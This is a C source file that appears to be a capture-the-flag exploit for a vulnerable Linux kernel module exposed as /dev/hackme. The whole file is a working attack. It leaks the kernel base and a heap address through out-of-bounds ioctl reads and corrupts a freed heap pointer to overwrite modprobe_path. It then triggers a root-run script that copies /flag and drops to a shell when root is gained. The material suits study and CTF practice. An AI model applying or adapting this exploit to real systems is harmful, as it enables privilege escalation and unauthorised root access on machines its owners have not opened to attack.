#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

long user_cs;
long user_ss;
long user_sp;
long user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

#define REQ_CREATE 0x30000
#define REQ_DELETE 0x30001
#define REQ_READ 0x30003
#define REQ_WRITE 0x30002

struct command {
    unsigned int index;
    unsigned int unused;
    char *buffer;
    long size;
    long offset;
};

int ioctl(int fd, unsigned long request, unsigned long param) {
    return syscall(16, fd, request, param);
}

void create_entry(int fd, int id, int size, char *init_buffer) {
    struct command command;
    
    command.index = id;
    command.buffer = init_buffer;
    command.size = size;

    ioctl(fd, REQ_CREATE, &command);
}

void delete_entry(int fd, long id) {
    struct command command;

    command.index = id;

    ioctl(fd, REQ_DELETE, &command);
}

void read_entry(int fd, int id, char *dest, int offset, int size) {
    struct command command;

    command.index = id;
    command.size = size;
    command.buffer = dest;
    command.offset = offset;

    ioctl(fd, REQ_READ, &command);
}

void write_entry(int fd, int id, char *src, int offset, int size) {
    struct command command;

    command.index = id;
    command.size = size;
    command.buffer = src;
    command.offset = offset;

    ioctl(fd, REQ_WRITE, &command);
}

void log(char *msg) {
    printf("[+] %s\n", msg);
}

void error(char *msg) {
    printf("[-] %s\n", msg);
    exit(-1);
}

long buf[0x200];
char payload[0x500] = "whoamiT";
int fd = -1;

int main()
{
	long i = 0;
	save_state();
	fd = open("/dev/hackme", O_RDONLY);

	system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
	system("chmod +x /home/pwn/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
	system("chmod +x /home/pwn/dummy");
	
	signal(SIGSEGV, get_shell);
	create_entry(fd, 0, 0x100, payload);
	read_entry(fd, 0, buf, -0x180, 0x180+0x10);
	// for (i=0; i<60; )	printf("0x%016lx\t0x%016lx\n", buf[i++], buf[i++]);
	long kernel_base = buf[21] - 0x849ae0;
	printf("kernel_base: %p\n", (void *)kernel_base);
	
	create_entry(fd, 1, 0x100, payload);
	create_entry(fd, 2, 0x100, payload);
	create_entry(fd, 3, 0x100, payload);
	create_entry(fd, 4, 0x100, payload);

	for (i=0; i < 0x200;buf[i++]=0);

	delete_entry(fd, 1);
	delete_entry(fd, 3);

	read_entry(fd, 4, buf, -0x100, 0x100+0x20);

	long heap_leak = buf[0];
	printf("heap_leak: %p\n", (void *)heap_leak);

	long modeprobe_path = kernel_base + 0x83f960;
	printf("modeprobe_path: %p\n", (void *)modeprobe_path);
	buf[0] = modeprobe_path - 0x10;
	write_entry(fd, 4, buf, -0x100, 0x100);

	read_entry(fd, 4, buf, -0x100, 0x100+0x20);
	
	create_entry(fd, 1, 0x100, payload);

	memcpy(payload+0x10, "/home/pwn/copy.sh\x00", 0x18);
	create_entry(fd, 3, 0x100, payload);

	system("/home/pwn/dummy");
    system("cat /home/pwn/flag");
    
    close(fd);

	return 0;
}
